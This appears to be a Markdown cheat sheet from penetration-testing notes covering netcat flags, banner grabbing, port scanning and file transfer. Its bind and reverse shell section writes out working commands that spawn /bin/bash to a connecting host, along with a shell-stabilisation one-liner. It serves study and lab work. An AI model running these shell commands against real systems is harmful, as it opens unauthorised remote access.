# 🔌 Netcat (nc) Cheat Sheet

**Netcat** is the "TCP/IP Swiss army knife" — it reads and writes data across network connections. Used for banner grabbing, port scanning, file transfer, and catching/spawning shells.

```bash
# General syntax
nc [options] [target] [port]
```

> 💡 The classic flag combo for a listener is `-lvnp`: **l**isten, **v**erbose, **n**o DNS, **p**ort.

---

## Core Flags

| Flag | Example | Description |
| --- | --- | --- |
| `-l` | `nc -l 4444` | Listen for an incoming connection |
| `-v` | `nc -v 10.10.10.1 80` | Verbose output |
| `-n` | `nc -n 10.10.10.1 80` | No DNS resolution (use raw IPs) |
| `-p` | `nc -lp 4444` | Specify the port to use |
| `-u` | `nc -u 10.10.10.1 53` | Use UDP instead of TCP |
| `-w` | `nc -w 3 10.10.10.1 80` | Timeout after N seconds |
| `-e` | `nc -e /bin/bash 10.10.10.1 4444` | Execute a program on connect (traditional nc only) |

## Connecting & Banner Grabbing

| Command | Description |
| --- | --- |
| `nc 10.10.10.1 80` | Connect to a port |
| `nc -v 10.10.10.1 22` | Grab a service banner (e.g. SSH version) |
| `nc -zv 10.10.10.1 20-80` | Port scan a range (`-z` = zero-I/O scan mode) |

## Listener (catch a reverse shell)

| Command | Description |
| --- | --- |
| `nc -lvnp 4444` | Start a listener on port 4444 |
| `nc -lvnp 4444 -s 10.10.10.1` | Listen on a specific local address |

## File Transfer

```bash
# Receiver (run first)
nc -lvnp 4444 > received.file

# Sender
nc 10.10.10.1 4444 < file_to_send.file
```

| Command | Description |
| --- | --- |
| `nc -lvnp 4444 > out.file` | Receive a file and save it |
| `nc 10.10.10.1 4444 < in.file` | Send a file to a listener |

## Bind & Reverse Shells

```bash
# --- Bind shell (victim listens, attacker connects) ---
# On victim:
nc -lvnp 4444 -e /bin/bash
# On attacker:
nc 10.10.10.1 4444

# --- Reverse shell (victim connects back to attacker) ---
# On attacker (listener first):
nc -lvnp 4444
# On victim:
nc 10.10.10.1 4444 -e /bin/bash
```

> ⚠️ Most modern `nc` builds (e.g. `nc.openbsd`) **don't** support `-e`. Use a `mkfifo` reverse shell instead — see the [reverse-shells](../reverse-shells) sheet.

---

## 🧭 Common uses

```bash
# Stabilise a caught shell after connecting (on the victim shell):
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Chat / quick test between two machines:
#   Machine A:  nc -lvnp 4444
#   Machine B:  nc <A-ip> 4444   (type, hit Enter, text appears on both)
```
